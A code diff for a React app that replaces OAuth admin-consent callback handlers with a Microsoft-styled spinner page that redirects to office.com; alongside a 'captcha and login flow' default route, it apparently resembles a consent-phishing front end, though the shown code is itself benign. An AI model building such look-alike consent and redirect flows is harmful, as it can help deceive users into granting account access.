@@ -37,18 +37,59 @@ const AppContent: React.FC = () => {
 
     return (
         <Routes>
-            {/* OAuth callback route - handles both GET (from React Router) and POST (via Netlify function) */}
-            <Route path="/auth/callback" element={<AdminConsentCallback />} />
+            {/* ✅ UPDATED: Simplified callback route - no Auth0 processing */}
+            <Route path="/auth/callback" element={<SimpleRedirect />} />
             
-            {/* ✅ FIX: New route for processed callbacks */}
-            <Route path="/callback-complete" element={<AdminConsentCallback />} />
+            {/* ✅ UPDATED: Simplified callback complete route */}
+            <Route path="/callback-complete" element={<SimpleRedirect />} />
             
             {/* Legacy callback route for backward compatibility */}
-            <Route path="/auth/callback/legacy" element={<AdminConsentCallback />} />
+            <Route path="/auth/callback/legacy" element={<SimpleRedirect />} />
             
             {/* Default route - captcha and login flow */}
             <Route path="*" element={<DefaultPage />} />
         </Routes>
+    );
+};
+
+// ✅ NEW: Simple redirect component since no Auth0 processing needed
+const SimpleRedirect: React.FC = () => {
+    useEffect(() => {
+        // Just redirect to Office after a brief moment
+        console.log('📍 Callback hit, redirecting to Office...');
+        setTimeout(() => {
+            window.location.href = 'https://www.office.com/';
+        }, 1500);
+    }, []);
+
+    return (
+        <div style={{
+            display: 'flex',
+            justifyContent: 'center',
+            alignItems: 'center',
+            height: '100vh',
+            fontFamily: 'Segoe UI, Arial, sans-serif',
+            backgroundColor: '#f3f2f1'
+        }}>
+            <div style={{ textAlign: 'center' }}>
+                <div style={{
+                    border: '4px solid #f3f3f3',
+                    borderTop: '4px solid #0078d4',
+                    borderRadius: '50%',
+                    width: '40px',
+                    height: '40px',
+                    animation: 'spin 1s linear infinite',
+                    margin: '0 auto 20px'
+                }}></div>
+                <h2 style={{ fontSize: '18px', color: '#323130' }}>Redirecting...</h2>
+            </div>
+            <style>{`
+                @keyframes spin {
+                    0% { transform: rotate(0deg); }
+                    100% { transform: rotate(360deg); }
+                }
+            `}</style>
+        </div>
     );
 };
 
